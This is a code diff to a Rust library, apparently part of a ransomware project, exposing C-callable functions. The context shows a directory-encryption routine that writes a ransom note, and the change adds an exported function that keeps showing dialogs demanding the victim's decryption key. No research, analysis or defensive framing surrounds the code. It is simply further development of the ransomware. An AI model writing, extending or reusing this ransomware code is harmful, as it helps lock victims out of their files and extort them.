@@ -109,8 +109,9 @@ pub extern "C" fn encrypt_directory(path: *const c_char, max_depth: u32) -> *mut
             // Create ransom note
             let _ = fileops::create_ransom_note(target_path, &key_hex);
             
-            // Show ransom dialog with key hint
-            let _ = ransom_dialog::show_ransom_dialog(&key_hex);
+            // Show ransom dialog (just warning, no interactive loop for now)
+            // The persistent interactive dialog should be run separately
+            let _ = ransom_dialog::show_encryption_complete_dialog(&key_hex);
             
             // Return key
             CString::new(format!("KEY:{}:ENCRYPTED:{}", key_hex, encrypted_count))
@@ -244,6 +245,57 @@ pub extern "C" fn free_string(s: *mut c_char) {
     unsafe {
         if !s.is_null() {
             let _ = CString::from_raw(s);
+        }
+    }
+}
+
+/// Shows a persistent ransom dialog with interactive key verification.
+///
+/// This function shows a series of MessageBox dialogs and PowerShell InputBox
+/// that repeatedly ask the user for the decryption key until the correct key is entered.
+///
+/// # Safety
+///
+/// This function catches panics to prevent crashing the parent process.
+///
+/// # Arguments
+///
+/// * `correct_key` - Null-terminated C string containing the correct decryption key
+///
+/// # Returns
+///
+/// Pointer to a C string containing the result.
+/// **MUST** be freed with `free_string()` when done.
+///
+/// # Format
+///
+/// On success: "OK:User entered correct key"
+/// On error: "ERROR:error_message"
+#[no_mangle]
+pub extern "C" fn show_persistent_ransom_dialog(correct_key: *const c_char) -> *mut c_char {
+    let result = panic::catch_unwind(|| {
+        unsafe {
+            if correct_key.is_null() {
+                return CString::new("ERROR:Null key provided").unwrap().into_raw();
+            }
+            
+            let key_c_str = std::ffi::CStr::from_ptr(correct_key);
+            let key_str = match key_c_str.to_str() {
+                Ok(s) => s,
+                Err(_) => return CString::new("ERROR:Invalid UTF-8 in key").unwrap().into_raw(),
+            };
+            
+            match ransom_dialog::show_ransom_dialog(key_str) {
+                Ok(_) => CString::new("OK:User entered correct key").unwrap().into_raw(),
+                Err(e) => CString::new(format!("ERROR:{}", e)).unwrap().into_raw(),
+            }
+        }
+    });
+    
+    match result {
+        Ok(ptr) => ptr,
+        Err(_) => {
+            CString::new("ERROR:Panic during dialog display").unwrap().into_raw()
         }
     }
 }
